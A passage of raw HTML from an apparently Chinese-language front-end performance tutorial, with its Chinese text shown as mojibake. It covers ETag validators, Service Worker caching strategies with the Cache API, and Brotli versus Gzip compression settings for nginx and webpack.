class="hljs-comment">// å¼±ETagç”Ÿæˆ</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">generateWeakEtag</span>(<span class="hljs-params">version</span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`W/&quot;<span class="hljs-subst">$&#123;version&#125;</span>&quot;`</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>æ€»ç»“</strong></p><ol><li>æ‰€æœ‰å¯ç¼“å­˜èµ„æºè®¾ç½®ETagæˆ–Last-Modified</li><li>é™æ€èµ„æºä¼˜å…ˆä½¿ç”¨å¼ºETag</li><li>åŠ¨æ€APIä½¿ç”¨å¼±ETagï¼ˆç‰ˆæœ¬å·ï¼‰</li><li>ç¦ç”¨ä¸å¿…è¦èµ„æºçš„Last-Modified</li><li>é…åˆCache-Controlå®šä¹‰ç¼“å­˜å‘¨æœŸ</li><li>åˆ†å¸ƒå¼ç¯å¢ƒç¡®ä¿éªŒè¯å™¨ä¸€è‡´æ€§</li></ol><h3 id="Service-Worker-ç¦»çº¿ç¼“å­˜ç­–ç•¥ï¼ˆCache-APIï¼‰"><a href="#Service-Worker-ç¦»çº¿ç¼“å­˜ç­–ç•¥ï¼ˆCache-APIï¼‰" class="headerlink" title="Service Worker ç¦»çº¿ç¼“å­˜ç­–ç•¥ï¼ˆCache APIï¼‰"></a>Service Worker ç¦»çº¿ç¼“å­˜ç­–ç•¥ï¼ˆCache APIï¼‰</h3><p><strong>æ ¸å¿ƒæœºåˆ¶</strong></p><p>æŠ€æœ¯æ¶æ„ï¼š</p><pre class="mermaid">graph LR    A[æµè§ˆå™¨ä¸»çº¿ç¨‹] --> B[Service Worker]    B --> C[Cache API]    B --> D[Fetch API]    C --> E[ç¼“å­˜å­˜å‚¨]    D --> F[ç½‘ç»œè¯·æ±‚]</pre><ul><li>ç‹¬ç«‹çº¿ç¨‹ï¼šåœ¨æµè§ˆå™¨åå°è¿è¡Œï¼Œä¸é˜»å¡ä¸»çº¿ç¨‹</li><li>ç”Ÿå‘½å‘¨æœŸï¼šæ³¨å†Œ â†’ å®‰è£… â†’ æ¿€æ´» â†’ æ‹¦æˆªè¯·æ±‚ â†’ ç»ˆæ­¢</li><li>ä½œç”¨åŸŸé™åˆ¶ï¼šä»…èƒ½æ§åˆ¶åŒæºä¸‹çš„ scope è·¯å¾„</li></ul><p><strong>Cache API æ ¸å¿ƒæ“ä½œ</strong></p><p>ç¼“å­˜æ“ä½œæŒ‡ä»¤é›†ï¼š</p><table><thead><tr><th align="left">æ–¹æ³•</th><th align="left">åŠŸèƒ½</th><th align="left">ç¤ºä¾‹</th></tr></thead><tbody><tr><td align="left">caches.open(name)</td><td align="left">åˆ›å»º&#x2F;è®¿é—®å‘½åç¼“å­˜ç©ºé—´</td><td align="left">const cache &#x3D; await caches.open(â€˜v1â€™)</td></tr><tr><td align="left">cache.add(url)</td><td align="left">ç¼“å­˜å•ä¸ªè¯·æ±‚</td><td align="left">cache.add(â€˜&#x2F;styles.cssâ€™)</td></tr><tr><td align="left">cache.addAll(urls)</td><td align="left">æ‰¹é‡ç¼“å­˜è¯·æ±‚</td><td align="left">cache.addAll(assets)</td></tr><tr><td align="left">cache.put(req, res)</td><td align="left">æ‰‹åŠ¨å­˜å‚¨å“åº”</td><td align="left">cache.put(event.request, response)</td></tr><tr><td align="left">cache.match(req)</td><td align="left">æŸ¥æ‰¾ç¼“å­˜åŒ¹é…</td><td align="left">cache.match(event.request)</td></tr><tr><td align="left">cache.delete(req)</td><td align="left">åˆ é™¤ç‰¹å®šç¼“å­˜</td><td align="left">cache.delete(â€˜&#x2F;old.jsâ€™)</td></tr><tr><td align="left">caches.delete(name)</td><td align="left">åˆ é™¤æ•´ä¸ªç¼“å­˜åº“</td><td align="left">caches.delete(â€˜v1â€™)</td></tr><tr><td align="left">caches.keys()</td><td align="left">åˆ—å‡ºæ‰€æœ‰ç¼“å­˜åº“åç§°</td><td align="left">const keys &#x3D; await caches.keys()</td></tr></tbody></table><p><strong>ç¦»çº¿ç¼“å­˜ç­–ç•¥</strong></p><p>(1) ç¼“å­˜ä¼˜å…ˆï¼ˆCache Firstï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">respondWith</span>(<br>    caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>)<br>      .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> cached || <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>))<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>é€‚ç”¨åœºæ™¯ï¼šé™æ€èµ„æºï¼ˆCSS&#x2F;JS&#x2F;å›¾ç‰‡ï¼‰</li><li>ä¼˜åŠ¿ï¼šç¦»çº¿å¯ç”¨ï¼Œæé€Ÿå“åº”</li><li>é£é™©ï¼šå¯èƒ½è¿”å›è¿‡æœŸå†…å®¹</li></ul><p>(2) ç½‘ç»œä¼˜å…ˆï¼ˆNetwork Firstï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(<br>  <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>)<br>    .<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>))<br>);<br></code></pre></td></tr></table></figure><ul><li>é€‚ç”¨åœºæ™¯ï¼šå®æ—¶æ•°æ®ï¼ˆè‚¡ç¥¨&#x2F;æ–°é—»ï¼‰</li><li>ä¼˜åŠ¿ï¼šå†…å®¹æœ€æ–°</li><li>é£é™©ï¼šå¼±ç½‘ç¯å¢ƒå»¶è¿Ÿé«˜</li></ul><p>(3) å¢é‡ç¼“å­˜ï¼ˆStale-While-Revalidateï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(<br>  caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cached</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">const</span> fetchPromise = <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">netRes</span> =&gt;</span> &#123;<br>      <span class="hljs-comment">// æ›´æ–°ç¼“å­˜</span><br>      caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> cache.<span class="hljs-title function_">put</span>(event.<span class="hljs-property">request</span>, netRes));<br>      <span class="hljs-keyword">return</span> netRes.<span class="hljs-title function_">clone</span>();<br>    &#125;);<br>    <span class="hljs-keyword">return</span> cached || fetchPromise;<br>  &#125;)<br>);<br></code></pre></td></tr></table></figure><ul><li>é€‚ç”¨åœºæ™¯ï¼šé¢‘ç¹æ›´æ–°èµ„æºï¼ˆç”¨æˆ·å¤´åƒ&#x2F;è¯„è®ºï¼‰</li><li>ä¼˜åŠ¿ï¼šå¹³è¡¡é€Ÿåº¦ä¸æ–°é²œåº¦</li><li>å¼€é”€ï¼šé¢å¤–ç½‘ç»œè¯·æ±‚</li></ul><p>(4) ä»…ç¼“å­˜ï¼ˆCache Onlyï¼‰</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">event.<span class="hljs-title function_">respondWith</span>(caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>));<br></code></pre></td></tr></table></figure><ul><li>é€‚ç”¨åœºæ™¯ï¼šæ ¸å¿ƒç¦»çº¿èµ„æºï¼ˆApp Shellï¼‰</li><li>é£é™©ï¼šæœªç¼“å­˜èµ„æºç›´æ¥å¤±è´¥</li></ul><p><strong>é¢„ç¼“å­˜ç­–ç•¥ï¼ˆå®‰è£…é˜¶æ®µï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Service Worker å®‰è£…é˜¶æ®µ</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;install&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>      cache.<span class="hljs-title function_">addAll</span>([<br>        <span class="hljs-string">&#x27;/&#x27;</span>,<br>        <span class="hljs-string">&#x27;/index.html&#x27;</span>,<br>        <span class="hljs-string">&#x27;/styles/main.css&#x27;</span>,<br>        <span class="hljs-string">&#x27;/scripts/app.js&#x27;</span>,<br>        <span class="hljs-string">&#x27;/images/logo.webp&#x27;</span><br>      ])<br>    )<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><ul><li>event.waitUntilï¼šå»¶è¿Ÿå®‰è£…ç›´åˆ°ç¼“å­˜å®Œæˆ</li><li>ç‰ˆæœ¬æ§åˆ¶ï¼šæ¯æ¬¡æ›´æ–°ä½¿ç”¨æ–°ç¼“å­˜åï¼ˆv2, v3ï¼‰</li><li>ç¼“å­˜æ¸…ç†ï¼šæ¿€æ´»é˜¶æ®µåˆ é™¤æ—§ç¼“å­˜ï¼š</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;activate&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  event.<span class="hljs-title function_">waitUntil</span>(<br>    caches.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> <br>      <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(keys.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> key !== <span class="hljs-string">&#x27;v2&#x27;</span> &amp;&amp; caches.<span class="hljs-title function_">delete</span>(key)))<br>    )<br>  );<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>åŠ¨æ€ç¼“å­˜ç­–ç•¥ï¼ˆè¿è¡Œæ—¶ï¼‰</strong></p><p>æŒ‰éœ€ç¼“å­˜ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;fetch&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-comment">// ä»…ç¼“å­˜GETè¯·æ±‚å’ŒåŒæºèµ„æº</span><br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">request</span>.<span class="hljs-property">method</span> === <span class="hljs-string">&#x27;GET&#x27;</span> &amp;&amp; <br>      event.<span class="hljs-property">request</span>.<span class="hljs-property">url</span>.<span class="hljs-title function_">startsWith</span>(self.<span class="hljs-property">location</span>.<span class="hljs-property">origin</span>)) &#123;<br>    event.<span class="hljs-title function_">respondWith</span>(<br>      <span class="hljs-title function_">fetch</span>(event.<span class="hljs-property">request</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">netRes</span> =&gt;</span> &#123;<br>        <span class="hljs-comment">// å…‹éš†å“åº”ï¼ˆæµåªèƒ½ä½¿ç”¨ä¸€æ¬¡ï¼‰</span><br>        <span class="hljs-keyword">const</span> resClone = netRes.<span class="hljs-title function_">clone</span>();<br>        caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;dynamic&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>          cache.<span class="hljs-title function_">put</span>(event.<span class="hljs-property">request</span>, resClone)<br>        );<br>        <span class="hljs-keyword">return</span> netRes;<br>      &#125;).<span class="hljs-title function_">catch</span>(<span class="hljs-function">() =&gt;</span> caches.<span class="hljs-title function_">match</span>(event.<span class="hljs-property">request</span>))<br>    );<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p><strong>ç¼“å­˜æ›´æ–°ç­–ç•¥</strong></p><p>(1) ç‰ˆæœ¬åŒ–èµ„æº</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// ç›‘å¬æ¶ˆæ¯ï¼ˆä¸»çº¿ç¨‹å‘é€æ›´æ–°å‘½ä»¤ï¼‰</span><br>self.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;message&#x27;</span>, <span class="hljs-function"><span class="hljs-params">event</span> =&gt;</span> &#123;<br>  <span class="hljs-keyword">if</span> (event.<span class="hljs-property">data</span> === <span class="hljs-string">&#x27;update&#x27;</span>) &#123;<br>    caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v2&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>      cache.<span class="hljs-title function_">addAll</span>([<span class="hljs-string">&#x27;/new-style.css&#x27;</span>, <span class="hljs-string">&#x27;/new-app.js&#x27;</span>])<br>    );<br>  &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>(2) å†…å®¹ Hash æ ¡éªŒ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// æ£€æŸ¥èµ„æºæ›´æ–°</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">checkUpdate</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">url</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> cacheRes = <span class="hljs-keyword">await</span> caches.<span class="hljs-title function_">match</span>(url);<br>  <span class="hljs-keyword">const</span> netRes = <span class="hljs-keyword">await</span> <span class="hljs-title function_">fetch</span>(url);<br>  <br>  <span class="hljs-comment">// æ¯”è¾ƒETag</span><br>  <span class="hljs-keyword">if</span> (cacheRes.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;ETag&#x27;</span>) !== netRes.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;ETag&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">const</span> cache = <span class="hljs-keyword">await</span> caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;v1&#x27;</span>);<br>    <span class="hljs-keyword">await</span> cache.<span class="hljs-title function_">put</span>(url, netRes.<span class="hljs-title function_">clone</span>());<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;;<br></code></pre></td></tr></table></figure><p><strong>æ€§èƒ½ä¼˜åŒ–æŠ€å·§</strong></p><p>(1) ç¼“å­˜åˆ†æ®µ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">CACHE_TYPES</span> = &#123;<br>  <span class="hljs-attr">CORE</span>: <span class="hljs-string">&#x27;core-v1&#x27;</span>,    <span class="hljs-comment">// æ ¸å¿ƒApp Shell</span><br>  <span class="hljs-attr">STATIC</span>: <span class="hljs-string">&#x27;static-v1&#x27;</span>, <span class="hljs-comment">// ä¸å¸¸å˜èµ„æº</span><br>  <span class="hljs-attr">DYNAMIC</span>: <span class="hljs-string">&#x27;dynamic&#x27;</span>   <span class="hljs-comment">// ç»å¸¸å˜èµ„æº</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>(2) ç¼“å­˜å®¹é‡æ§åˆ¶</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é™åˆ¶åŠ¨æ€ç¼“å­˜æ•°é‡</span><br>caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;dynamic&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> &#123;<br>  cache.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> &#123;<br>    <span class="hljs-keyword">if</span> (keys.<span class="hljs-property">length</span> &gt; <span class="hljs-number">100</span>) cache.<span class="hljs-title function_">delete</span>(keys[<span class="hljs-number">0</span>]);<br>  &#125;);<br>&#125;);<br></code></pre></td></tr></table></figure><p>(3) ç¼“å­˜è¿‡æœŸ</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å®šæ—¶æ¸…ç†æ—§ç¼“å­˜</span><br><span class="hljs-built_in">setInterval</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>  caches.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;dynamic&#x27;</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">cache</span> =&gt;</span> <br>    cache.<span class="hljs-title function_">keys</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">keys</span> =&gt;</span> keys.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">key</span> =&gt;</span> &#123;<br>      <span class="hljs-keyword">if</span> (<span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>() - <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(key.<span class="hljs-property">headers</span>.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;date&#x27;</span>)) &gt; <span class="hljs-number">86400000</span>) &#123;<br>        cache.<span class="hljs-title function_">delete</span>(key);<br>      &#125;<br>    &#125;))<br>  );<br>&#125;, <span class="hljs-number">3600000</span>);<br></code></pre></td></tr></table></figure><p><strong>å®‰å…¨æ³¨æ„äº‹é¡¹</strong></p><ul><li>HTTPS å¼ºåˆ¶è¦æ±‚ï¼šService Worker ä»…é™å®‰å…¨ä¸Šä¸‹æ–‡</li><li>ç¼“å­˜æ•æ„Ÿæ•°æ®ï¼šé¿å…ç¼“å­˜ç§å¯†å†…å®¹ï¼ˆå¦‚ Cache-Control: privateï¼‰</li><li>è·¨åŸŸèµ„æºé™åˆ¶ï¼š<ul><li>ç¼“å­˜è·¨åŸŸèµ„æºéœ€è®¾ç½® CORS å“åº”å¤´</li><li>fetch æ¨¡å¼éœ€ä¸º cors</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">cache.<span class="hljs-title function_">put</span>(<span class="hljs-title function_">fetch</span>(<span class="hljs-string">&#x27;https://api.example.com/data&#x27;</span>, &#123; <span class="hljs-attr">mode</span>: <span class="hljs-string">&#x27;cors&#x27;</span> &#125;))<br></code></pre></td></tr></table></figure><p><strong>æµè§ˆå™¨å…¼å®¹æ€§</strong></p><table><thead><tr><th align="left">æµè§ˆå™¨</th><th align="left">æ”¯æŒç‰ˆæœ¬</th><th align="left">å…³é”®é™åˆ¶</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">40+</td><td align="left">å®Œæ•´æ”¯æŒ</td></tr><tr><td align="left">Firefox</td><td align="left">44+</td><td align="left">éšç§æ¨¡å¼å—é™</td></tr><tr><td align="left">Safari</td><td align="left">11.1+</td><td align="left">ç”Ÿå‘½å‘¨æœŸç®¡ç†å·®å¼‚</td></tr><tr><td align="left">Edge</td><td align="left">17+</td><td align="left">å®Œæ•´æ”¯æŒ</td></tr><tr><td align="left">ç§»åŠ¨ç«¯å…¼å®¹</td><td align="left">Android 5+ &#x2F; iOS 11.3+</td><td align="left">éƒ¨åˆ†APIé™åˆ¶</td></tr></tbody></table><p><strong>æ€»ç»“</strong></p><ol><li>æ‰€æœ‰é™æ€èµ„æºé¢„ç¼“å­˜</li><li>å®ç°ç¼“å­˜æ¸…ç†æœºåˆ¶ï¼ˆactivateé˜¶æ®µï¼‰</li><li>åŠ¨æ€èµ„æºè®¾ç½®å®¹é‡ä¸Šé™</li><li>åŒºåˆ†æ ¸å¿ƒ&#x2F;é™æ€&#x2F;åŠ¨æ€ç¼“å­˜ç­–ç•¥</li><li>æ·»åŠ ç¼“å­˜æ›´æ–°æç¤ºé€»è¾‘</li><li>é…ç½®HTTPç¼“å­˜å¤´ååŒï¼ˆmax-age&#x3D;0 ç»•è¿‡SWç¼“å­˜ï¼‰</li></ol><h2 id="2-3-èµ„æºå‹ç¼©ä¸äº¤ä»˜"><a href="#2-3-èµ„æºå‹ç¼©ä¸äº¤ä»˜" class="headerlink" title="2.3 èµ„æºå‹ç¼©ä¸äº¤ä»˜"></a>2.3 èµ„æºå‹ç¼©ä¸äº¤ä»˜</h2><h3 id="Brotli-vs-Gzip-å‹ç¼©ç®—æ³•"><a href="#Brotli-vs-Gzip-å‹ç¼©ç®—æ³•" class="headerlink" title="Brotli vs Gzip å‹ç¼©ç®—æ³•"></a>Brotli vs Gzip å‹ç¼©ç®—æ³•</h3><p><strong>æ ¸å¿ƒæœºåˆ¶å¯¹æ¯”</strong></p><table><thead><tr><th align="left">ç»´åº¦</th><th align="left">Gzip (DEFLATE)</th><th align="left">Brotli</th></tr></thead><tbody><tr><td align="left">ç®—æ³•åŸºç¡€</td><td align="left">LZ77 + éœå¤«æ›¼ç¼–ç </td><td align="left">LZ77 + äºŒé˜¶ä¸Šä¸‹æ–‡å»ºæ¨¡</td></tr><tr><td align="left">è¯ç”Ÿæ—¶é—´</td><td align="left">1992å¹´ï¼ˆRFC 1951ï¼‰</td><td align="left">2013å¹´ï¼ˆGoogleå¼€å‘ï¼‰</td></tr><tr><td align="left">å‹ç¼©çº§åˆ«</td><td align="left">1-9ï¼ˆé»˜è®¤6ï¼‰</td><td align="left">0-11ï¼ˆé»˜è®¤11ï¼‰</td></tr><tr><td align="left">æ ¸å¿ƒä¼˜åŠ¿</td><td align="left">å¹¿æ³›å…¼å®¹ï¼ŒCPUæ¶ˆè€—ä½</td><td align="left">é«˜å‹ç¼©ç‡ï¼ˆå°¤å…¶æ–‡æœ¬èµ„æºï¼‰</td></tr><tr><td align="left">å­—å…¸æ”¯æŒ</td><td align="left">æ— é¢„å®šä¹‰å­—å…¸</td><td align="left">å†…ç½®120KBé™æ€å­—å…¸ï¼ˆå«HTML&#x2F;CSS&#x2F;JSå¸¸è§æ ‡è®°ï¼‰</td></tr></tbody></table><p><strong>æµè§ˆå™¨å…¼å®¹æ€§</strong></p><table><thead><tr><th align="left">æµè§ˆå™¨</th><th align="left">Gzipæ”¯æŒ</th><th align="left">Brotliæ”¯æŒ</th><th align="left">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="left">Chrome</td><td align="left">âœ… å…¨ç‰ˆæœ¬</td><td align="left">âœ… 49+</td><td align="left">Android 5.0+</td></tr><tr><td align="left">Firefox</td><td align="left">âœ… å…¨ç‰ˆæœ¬</td><td align="left">âœ… 44+</td><td align="left"></td></tr><tr><td align="left">Safari</td><td align="left">âœ… å…¨ç‰ˆæœ¬</td><td align="left">âœ… 11+ (macOS&#x2F;iOS)</td><td align="left">macOS High Sierra+</td></tr><tr><td align="left">Edge</td><td align="left">âœ… å…¨ç‰ˆæœ¬</td><td align="left">âœ… 15+</td><td align="left"></td></tr><tr><td align="left">IE 11</td><td align="left">âœ…</td><td align="left">âŒ</td><td align="left">ä¸æ”¯æŒ</td></tr></tbody></table><p><strong>æœåŠ¡å™¨é…ç½®ç­–ç•¥</strong></p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># å¯ç”¨Gzip</span><br><span class="hljs-attribute">gzip</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">gzip_types</span> text/plain text/css application/json application/javascript;<br><span class="hljs-attribute">gzip_comp_level</span> <span class="hljs-number">6</span>;  <span class="hljs-comment"># æ¨è6ï¼ˆå¹³è¡¡æ¨¡å¼ï¼‰</span><br><br><span class="hljs-comment"># å¯ç”¨Brotliï¼ˆéœ€å®‰è£…brotliæ¨¡å—ï¼‰</span><br><span class="hljs-attribute">brotli</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">brotli_types</span> text/plain text/css application/json application/javascript;<br><span class="hljs-attribute">brotli_comp_level</span> <span class="hljs-number">6</span>; <span class="hljs-comment"># ç”Ÿäº§ç¯å¢ƒæ¨è6ï¼ˆé11ï¼‰</span><br></code></pre></td></tr></table></figure><p>å‹ç¼©çº§åˆ«é€‰æ‹©å»ºè®®ï¼š</p><table><thead><tr><th align="left">åœºæ™¯</th><th align="left">Gzipçº§åˆ«</th><th align="left">Brotliçº§åˆ«</th><th align="left">ç†ç”±</th></tr></thead><tbody><tr><td align="left">å®æ—¶å‹ç¼©ï¼ˆåŠ¨æ€ï¼‰</td><td align="left">1-3</td><td align="left">0-4</td><td align="left">é€Ÿåº¦ä¼˜å…ˆï¼Œé™ä½CPUè´Ÿè½½</td></tr><tr><td align="left">é¢„å‹ç¼©ï¼ˆé™æ€ï¼‰</td><td align="left">9</td><td align="left">11</td><td align="left">ä½“ç§¯ä¼˜å…ˆï¼Œæ„å»ºæ—¶å®Œæˆå‹ç¼©</td></tr></tbody></table><p><strong>é¢„å‹ç¼©å®è·µ</strong></p><p>(1) webpack é…ç½®</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åŒæ—¶ç”Ÿæˆgzipå’Œbré¢„å‹ç¼©æ–‡ä»¶</span><br><span class="hljs-keyword">const</span> <span class="hljs-title class_">CompressionPlugin</span> = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;compression-webpack-plugin&#x27;</span>);<br><br><span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = &#123;<br>  <span class="hljs-attr">plugins</span>: [<br>    <span class="hljs-keyword">new</span> <span class="hljs-title class_">CompressionPlugin</span>(&#123;  <span class="hljs-comment">// gzip</span><br>      <span class="hljs-attr">algorithm</span>: <span class="hljs-string">&#x27;gzip&#x27;</span>,<br>      <span class="hljs-attr">threshold</span>: <span class="hljs-number">10240</span>,<br>      <span 